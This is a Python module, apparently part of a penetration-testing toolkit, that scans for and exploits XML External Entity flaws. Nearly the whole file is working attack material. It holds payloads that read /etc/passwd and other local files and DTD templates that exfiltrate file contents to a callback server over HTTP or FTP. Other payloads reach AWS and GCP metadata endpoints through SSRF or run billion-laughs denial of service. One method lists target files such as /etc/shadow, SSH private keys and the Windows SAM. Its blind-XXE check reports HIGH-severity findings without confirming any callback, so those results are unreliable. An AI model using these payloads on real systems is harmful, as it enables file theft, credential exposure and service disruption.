"""
XML External Entity (XXE) Injection Scanner

Comprehensive XXE detection and exploitation module supporting:
- Classic XXE (file disclosure)
- Blind XXE (out-of-band exfiltration)
- XXE via DTD parameter entities
- XXE in SOAP, SVG, XLSX, DOCX, and other XML-based formats
- XXE via file upload
- Error-based XXE exfiltration

Based on OWASP XXE Prevention Cheat Sheet, PortSwigger research,
and real-world penetration testing methodologies.
"""

import base64
import hashlib
import random
import string
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse


class XXEType(Enum):
    """Types of XXE attacks."""
    CLASSIC = "classic"  # Direct entity expansion
    BLIND_OOB = "blind_oob"  # Out-of-band data exfiltration
    ERROR_BASED = "error_based"  # Exfil via error messages
    PARAMETER_ENTITY = "parameter_entity"  # DTD parameter entity
    SSRF = "ssrf"  # Server-Side Request Forgery via XXE
    DOS = "dos"  # Billion laughs / entity expansion DoS


class XXEContext(Enum):
    """XML contexts where XXE can occur."""
    BODY = "body"  # Direct XML body
    SOAP = "soap"  # SOAP envelope
    SVG = "svg"  # SVG images
    XLSX = "xlsx"  # Excel files
    DOCX = "docx"  # Word documents
    RSS = "rss"  # RSS/Atom feeds
    SAML = "saml"  # SAML assertions
    XSLT = "xslt"  # XSLT transformations


@dataclass
class XXEPayload:
    """XXE payload definition."""
    name: str
    payload: str
    xxe_type: XXEType
    context: XXEContext
    description: str
    expected_indicator: str = ""
    file_target: str = "/etc/passwd"
    requires_callback: bool = False
    windows_variant: str = ""


@dataclass
class XXEFinding:
    """XXE vulnerability finding."""
    url: str
    xxe_type: XXEType
    context: XXEContext
    payload: str
    evidence: str
    severity: str
    data_exfiltrated: str = ""
    callback_received: bool = False
    files_readable: List[str] = field(default_factory=list)
    ssrf_confirmed: bool = False


class XXEScanner:
    """
    Advanced XXE scanner with multiple exfiltration techniques.

    Features:
    - Multi-context detection (SOAP, SVG, Office docs, etc.)
    - Blind XXE with OOB exfiltration
    - Error-based data extraction
    - File read confirmation
    - SSRF via XXE
    - WAF bypass techniques
    - Automated payload generation
    """

    def __init__(self, callback_host: str = None, timeout: float = 15.0):
        self.callback_host = callback_host
        self.timeout = timeout
        self.findings: List[XXEFinding] = []

        # Generate unique tokens for OOB detection
        self.oob_token = ''.join(random.choices(string.ascii_lowercase, k=12))

        self._init_payloads()

    def _init_payloads(self):
        """Initialize comprehensive XXE payload database."""

        # Classic file disclosure payloads
        self.classic_payloads = [
            XXEPayload(
                name="Basic External Entity",
                payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>''',
                xxe_type=XXEType.CLASSIC,
                context=XXEContext.BODY,
                description="Basic external entity file read",
                expected_indicator="root:x:0:0",
                windows_variant='''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<data>&xxe;</data>'''
            ),
            XXEPayload(
                name="Base64 Encoded Output",
                payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>''',
                xxe_type=XXEType.CLASSIC,
                context=XXEContext.BODY,
                description="PHP filter wrapper for base64 encoded output",
                expected_indicator="cm9vdDp"  # base64 of "root:x"
            ),
            XXEPayload(
                name="UTF-7 Encoding Bypass",
                payload='''<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-
  +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-data+AD4-+ACY-xxe+ADsAPA-/data+AD4-''',
                xxe_type=XXEType.CLASSIC,
                context=XXEContext.BODY,
                description="UTF-7 encoding to bypass filters",
                expected_indicator="root"
            ),
            XXEPayload(
                name="UTF-16 Encoding",
                payload='''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>''',
                xxe_type=XXEType.CLASSIC,
                context=XXEContext.BODY,
                description="UTF-16 encoding variant",
                expected_indicator="root"
            ),
        ]

        # Blind OOB XXE payloads
        self.blind_oob_payloads = [
            XXEPayload(
                name="External DTD Exfiltration",
                payload=f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{self.callback_host or 'CALLBACK'}/xxe.dtd">
  %xxe;
  %param1;
]>
<data>&exfil;</data>''',
                xxe_type=XXEType.BLIND_OOB,
                context=XXEContext.BODY,
                description="External DTD with parameter entity exfil",
                requires_callback=True
            ),
            XXEPayload(
                name="DNS OOB Detection",
                payload=f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{self.oob_token}.{self.callback_host or 'CALLBACK'}/xxe">
]>
<data>&xxe;</data>''',
                xxe_type=XXEType.BLIND_OOB,
                context=XXEContext.BODY,
                description="DNS-based OOB detection",
                requires_callback=True
            ),
            XXEPayload(
                name="FTP OOB Exfiltration",
                payload=f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://{self.callback_host or 'CALLBACK'}/ftp.dtd">
  %dtd;
]>
<data>&send;</data>''',
                xxe_type=XXEType.BLIND_OOB,
                context=XXEContext.BODY,
                description="FTP-based data exfiltration",
                requires_callback=True
            ),
        ]

        # Error-based XXE payloads
        self.error_based_payloads = [
            XXEPayload(
                name="Error-based File Disclosure",
                payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<data>error</data>''',
                xxe_type=XXEType.ERROR_BASED,
                context=XXEContext.BODY,
                description="Error message contains file contents",
                expected_indicator="root:x"
            ),
            XXEPayload(
                name="Local DTD Error-based",
                payload='''<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<data>error</data>''',
                xxe_type=XXEType.ERROR_BASED,
                context=XXEContext.BODY,
                description="Reusing local DTD for error-based exfil",
                expected_indicator="root:x"
            ),
        ]

        # SSRF via XXE
        self.ssrf_payloads = [
            XXEPayload(
                name="Internal Network Scan",
                payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<data>&xxe;</data>''',
                xxe_type=XXEType.SSRF,
                context=XXEContext.BODY,
                description="SSRF to internal services"
            ),
            XXEPayload(
                name="Cloud Metadata Access",
                payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>''',
                xxe_type=XXEType.SSRF,
                context=XXEContext.BODY,
                description="AWS metadata service access",
                expected_indicator="ami-id"
            ),
            XXEPayload(
                name="GCP Metadata Access",
                payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
]>
<data>&xxe;</data>''',
                xxe_type=XXEType.SSRF,
                context=XXEContext.BODY,
                description="GCP metadata service access"
            ),
        ]

        # Context-specific payloads
        self.soap_payloads = [
            XXEPayload(
                name="SOAP Body XXE",
                payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>''',
                xxe_type=XXEType.CLASSIC,
                context=XXEContext.SOAP,
                description="XXE in SOAP envelope",
                expected_indicator="root:x"
            ),
        ]

        self.svg_payloads = [
            XXEPayload(
                name="SVG External Entity",
                payload='''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>''',
                xxe_type=XXEType.CLASSIC,
                context=XXEContext.SVG,
                description="XXE in SVG image",
                expected_indicator="root"
            ),
            XXEPayload(
                name="SVG with XLINK",
                payload='''<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="&xxe;"/>
</svg>''',
                xxe_type=XXEType.CLASSIC,
                context=XXEContext.SVG,
                description="XXE via xlink:href in SVG",
                expected_indicator="root"
            ),
        ]

        # Billion Laughs DoS payloads (for testing only)
        self.dos_payloads = [
            XXEPayload(
                name="Billion Laughs",
                payload='''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<data>&lol4;</data>''',
                xxe_type=XXEType.DOS,
                context=XXEContext.BODY,
                description="Entity expansion DoS (Billion Laughs)",
            ),
            XXEPayload(
                name="Quadratic Blowup",
                payload='<?xml version="1.0"?><!DOCTYPE data [<!ENTITY a "' + 'A' * 50000 + '">]><data>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</data>',
                xxe_type=XXEType.DOS,
                context=XXEContext.BODY,
                description="Quadratic blowup DoS",
            ),
        ]

    def scan_endpoint(self, url: str, method: str = "POST",
                      content_type: str = "application/xml",
                      contexts: List[XXEContext] = None) -> List[Dict]:
        """
        Scan endpoint for XXE vulnerabilities.

        Args:
            url: Target URL
            method: HTTP method (usually POST)
            content_type: Content-Type header
            contexts: Specific contexts to test

        Returns:
            List of findings
        """
        findings = []
        contexts = contexts or [XXEContext.BODY]

        # Phase 1: Test classic XXE
        for payload in self.classic_payloads:
            result = self._test_payload(url, method, content_type, payload)
            if result:
                findings.append(result)
                # If we found a basic XXE, try to enumerate readable files
                if result.get("files_readable"):
                    pass  # Already populated

        # Phase 2: Test blind XXE (if callback host available)
        if self.callback_host:
            for payload in self.blind_oob_payloads:
                result = self._test_blind_payload(url, method, content_type, payload)
                if result:
                    findings.append(result)

        # Phase 3: Test error-based XXE
        for payload in self.error_based_payloads:
            result = self._test_payload(url, method, content_type, payload)
            if result:
                findings.append(result)

        # Phase 4: Test SSRF via XXE
        for payload in self.ssrf_payloads:
            result = self._test_payload(url, method, content_type, payload)
            if result:
                result["ssrf_confirmed"] = True
                findings.append(result)

        # Phase 5: Test context-specific (SOAP, SVG)
        if XXEContext.SOAP in contexts:
            for payload in self.soap_payloads:
                result = self._test_payload(url, method, "text/xml", payload)
                if result:
                    findings.append(result)

        if XXEContext.SVG in contexts:
            for payload in self.svg_payloads:
                result = self._test_payload(url, method, "image/svg+xml", payload)
                if result:
                    findings.append(result)

        return findings

    def _test_payload(self, url: str, method: str, content_type: str,
                     payload: XXEPayload) -> Optional[Dict]:
        """Test a single XXE payload."""
        try:
            import requests

            headers = {"Content-Type": content_type}
            resp = requests.request(
                method, url,
                data=payload.payload,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )

            # Check for indicators of success
            if payload.expected_indicator and payload.expected_indicator in resp.text:
                finding = {
                    "type": "XXE",
                    "xxe_type": payload.xxe_type.value,
                    "context": payload.context.value,
                    "url": url,
                    "payload": payload.name,
                    "payload_data": payload.payload[:500],
                    "evidence": f"Found '{payload.expected_indicator}' in response",
                    "severity": "CRITICAL",
                    "description": payload.description,
                    "files_readable": [payload.file_target],
                }

                # Try to extract actual data
                finding["extracted_data"] = self._extract_file_content(resp.text)

                return finding

            # Check for error messages that indicate XXE processing
            xxe_errors = [
                "external entity", "DOCTYPE", "entity",
                "failed to load external entity", "XML parsing error"
            ]
            for error in xxe_errors:
                if error.lower() in resp.text.lower():
                    return {
                        "type": "XXE (Potential)",
                        "xxe_type": payload.xxe_type.value,
                        "context": payload.context.value,
                        "url": url,
                        "payload": payload.name,
                        "evidence": f"Error message indicates XML entity processing: '{error}'",
                        "severity": "MEDIUM",
                        "description": "XXE processing detected but exfiltration not confirmed",
                    }

        except Exception as e:
            pass

        return None

    def _test_blind_payload(self, url: str, method: str, content_type: str,
                           payload: XXEPayload) -> Optional[Dict]:
        """Test blind XXE with OOB callbacks."""
        if not self.callback_host:
            return None

        try:
            import requests

            # Replace callback placeholder
            actual_payload = payload.payload.replace("CALLBACK", self.callback_host)

            headers = {"Content-Type": content_type}
            _ = requests.request(
                method, url,
                data=actual_payload,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )

            # In production, would check callback server here
            # For now, return potential finding
            return {
                "type": "XXE (Blind - Check Callback)",
                "xxe_type": payload.xxe_type.value,
                "context": payload.context.value,
                "url": url,
                "payload": payload.name,
                "callback_url": f"http://{self.callback_host}",
                "evidence": "Blind XXE payload sent - check callback server for hits",
                "severity": "HIGH",
                "description": payload.description,
            }

        except Exception:
            pass

        return None

    def _extract_file_content(self, response_text: str) -> str:
        """Extract file content from response."""
        # Try to extract /etc/passwd style content
        import re

        # Pattern for Unix passwd file
        passwd_pattern = r'(root:x?:0:0:.*?:/.*?(?:sh|bash))'
        match = re.search(passwd_pattern, response_text)
        if match:
            return match.group(1)

        # Pattern for Windows win.ini
        winini_pattern = r'(\[fonts\].*)'
        match = re.search(winini_pattern, response_text, re.IGNORECASE | re.DOTALL)
        if match:
            return match.group(1)[:200]

        return ""

    def generate_exfil_dtd(self, file_to_read: str = "/etc/passwd") -> str:
        """
        Generate external DTD file content for blind exfiltration.

        Host this DTD file on your callback server.
        """
        return f'''<!ENTITY % file SYSTEM "file://{file_to_read}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{self.callback_host}/?data=%file;'>">
%eval;'''

    def generate_ftp_exfil_dtd(self, file_to_read: str = "/etc/passwd") -> str:
        """
        Generate DTD for FTP-based exfiltration (handles multi-line files).

        Host this DTD and run FTP server to receive data.
        """
        return f'''<!ENTITY % file SYSTEM "file://{file_to_read}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://{self.callback_host}:21/%file;'>">
%eval;'''

    def generate_attack_suite(self) -> Dict[str, Any]:
        """Generate comprehensive XXE attack suite."""
        return {
            "detection_payloads": [p.payload for p in self.classic_payloads],
            "blind_payloads": [
                p.payload.replace("CALLBACK", self.callback_host or "YOUR_SERVER")
                for p in self.blind_oob_payloads
            ],
            "ssrf_payloads": [p.payload for p in self.ssrf_payloads],
            "soap_payloads": [p.payload for p in self.soap_payloads],
            "svg_payloads": [p.payload for p in self.svg_payloads],
            "exfil_dtd": self.generate_exfil_dtd(),
            "ftp_exfil_dtd": self.generate_ftp_exfil_dtd(),
            "interesting_files": {
                "linux": [
                    "/etc/passwd", "/etc/shadow", "/etc/hosts",
                    "/home/*/.ssh/id_rsa", "/home/*/.bash_history",
                    "/var/www/html/config.php", "/etc/nginx/nginx.conf",
                    "/proc/self/environ", "/proc/self/cmdline"
                ],
                "windows": [
                    "c:/windows/win.ini", "c:/windows/system32/config/SAM",
                    "c:/inetpub/wwwroot/web.config",
                    "c:/users/administrator/.ssh/id_rsa"
                ],
                "cloud": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/user-data/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                ],
            },
            "remediation": [
                "Disable external entity processing in XML parser",
                "Disable DTD processing entirely if not needed",
                "Use less complex data formats (JSON) where possible",
                "Implement server-side input validation",
                "Apply defense in depth with WAF rules",
            ]
        }


def quick_scan(url: str, callback_host: str = None) -> List[Dict]:
    """Quick XXE scan of a single endpoint."""
    scanner = XXEScanner(callback_host)
    return scanner.scan_endpoint(url)
